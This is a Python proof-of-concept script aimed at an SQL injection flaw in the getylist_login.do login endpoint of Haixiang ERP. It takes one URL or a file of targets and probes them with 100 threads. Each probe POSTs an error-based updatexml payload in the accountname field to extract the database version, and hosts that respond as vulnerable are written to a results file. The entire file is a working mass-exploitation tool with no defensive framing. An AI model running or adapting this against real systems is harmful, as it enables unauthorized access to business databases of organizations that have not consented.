import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    banner()
    parser = argparse.ArgumentParser(description='海翔ERP getylist_login.do SQL注入漏洞')
    parser.add_argument('-u','--url',help='plaese input attack url')
    parser.add_argument('-f','--file',help='please input attack file')
    agres = parser.parse_args()                                    
    if agres.url and not agres.file:                       
        poc(agres.url)                              
    elif agres.file and not agres.url:                
        url_list = []                             
        with open (agres.file,'r',encoding='utf-8') as fp:  
            for i in fp.readlines():                        
                url_list.append(i.strip().replace('\n',''))     
        mp = Pool(100)                    
        mp.map(poc, url_list)               
        mp.close()                        
        mp.join()                            
    else: 
        print(f'usag:\n\t python3 {sys.argv[0]} -h')
def banner():
    text="""

  ______ _____  _____               _         _ _     _     _             _            _       
 |  ____|  __ \|  __ \             | |       | (_)   | |   | |           (_)          | |      
 | |__  | |__) | |__) |   __ _  ___| |_ _   _| |_ ___| |_  | | ___   __ _ _ _ __    __| | ___  
 |  __| |  _  /|  ___/   / _` |/ _ \ __| | | | | / __| __| | |/ _ \ / _` | | '_ \  / _` |/ _ \ 
 | |____| | \ \| |      | (_| |  __/ |_| |_| | | \__ \ |_  | | (_) | (_| | | | | || (_| | (_) |
 |______|_|  \_\_|       \__, |\___|\__|\__, |_|_|___/\__| |_|\___/ \__, |_|_| |_(_)__,_|\___/ 
                          __/ |          __/ |         ______        __/ |                     
                         |___/          |___/         |______|      |___/                      

"""
def poc(target):
    url = target + '/getylist_login.do'
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    }
    data = {"accountname":"test' and (updatexml(1,concat(0x7e,(select version()),0x7e),1));--);--"}
    try:
        respnose = requests.post(url=url,headers=headers,data=data,timeout=5,verify=False)
        if  'XPATH syntax error' in respnose.text :
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]{target} Vulnerability exists'+'\n')
        else:
            print(f'[-]{target} Vulnerability does not exists')
    except:
        print(f'[*]{target} server error')


if __name__=='__main__':
    main()